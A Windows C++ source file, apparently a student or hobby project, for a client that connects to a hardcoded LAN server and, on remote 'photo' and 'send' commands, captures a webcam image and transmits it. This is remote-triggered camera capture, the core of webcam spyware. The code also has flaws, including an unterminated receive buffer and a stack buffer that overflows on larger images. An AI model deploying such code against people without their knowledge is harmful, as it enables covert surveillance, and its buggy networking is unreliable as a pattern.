#pragma once

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING	

#define VIDEO_FOLDER_NAME "./Video/"  // папка для видео
#define PHOTO_FOLDER_NAME "./Photo/"  // папка для фото
#define VIDEO_FORMAT ".avi"           // расширение видео
#define PHOTO_FORMAT ".jpg"           // расширение фото
#define PHOTO_DELAY 5000              // задержка между фото

#include <iostream>
#include <iomanip>
#include <experimental/filesystem>
#include <string>
#include <set>
#include <thread>
#include <atomic>
#include <locale.h>
#include <fstream>
#include <vector>
#include <cmath>

#include <opencv2\opencv.hpp>
#include <windows.h>
#include <vfw.h>
#include <setupapi.h>
#include <devguid.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Wsock32.lib")
#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "vfw32.lib")

using namespace std;
using namespace cv;

void makePhoto()
{
	Mat image;
	VideoCapture camera; 
	camera.open(0);
	if (!camera.isOpened()) {
		cout << "Error: failed to open webcam" << endl;
		exit(EXIT_FAILURE);
	}

	camera >> image;
	imwrite("./Photo/photo.jpg", image);

	camera.release();
}

int main() {

	string operation = "";

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		std::cerr << "WSAStartup failed." << std::endl;
		return 1;
	}

	// Создаем сокет  
	SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (clientSocket == INVALID_SOCKET) {
		std::cerr << "Error when creating a socket." << std::endl;
		WSACleanup();
		return 1;
	}

	// Задаем параметры сервера
	sockaddr_in serverAddr;
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_addr.s_addr = inet_addr("192.168.0.100"); // IP адрес сервера
	serverAddr.sin_port = htons(12345); // Порт сервера

	while (true)
	{
		Sleep(5000);
		int flag = 0;
		if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
		{
			std::cerr << "Error connecting to the server." << std::endl;
			closesocket(clientSocket);
			WSACleanup();
			flag = 1;
		}

		if (flag) {
			continue;
		}
		else {
			break;
		}
	}


	std::cout << "Connection" << std::endl;

	int bytesReceived;
	char buffer[102400];

	while (true) {
		bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
		operation = buffer;
		// getline(cin, operation);
		if (operation == "exit") {
			return 0;
		}
		else if (operation == "photo") {
			makePhoto();
		}
		else if (operation == "connect") {
			// Подключаемся к серверу
			if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
				std::cerr << "Error connecting to the server." << std::endl;
				closesocket(clientSocket);
				WSACleanup();
				return 1;
			}
		}
		else if (operation == "send") {
			std::ifstream inputFile("./Photo/photo.jpg", std::ios::binary);
			std::ofstream outputFile("output.txt");
			char message[102400];
			int bytesSent;

			if (inputFile.is_open()) {
				char byte;
				int i = 0;
				for (; inputFile.get(byte); i++) {
					message[i] = byte;
				}
				message[i] = '\0';

				bytesSent = send(clientSocket, message, i, 0);
				if (bytesSent == SOCKET_ERROR) {
					std::cerr << "Error sending the message." << std::endl;
					break;
				}

				inputFile.close();
				outputFile.close();
			}
			else {
				std::cerr << "Failed to open files." << std::endl;
			}
			std::cout << "sended" << std::endl;
		}
	}
}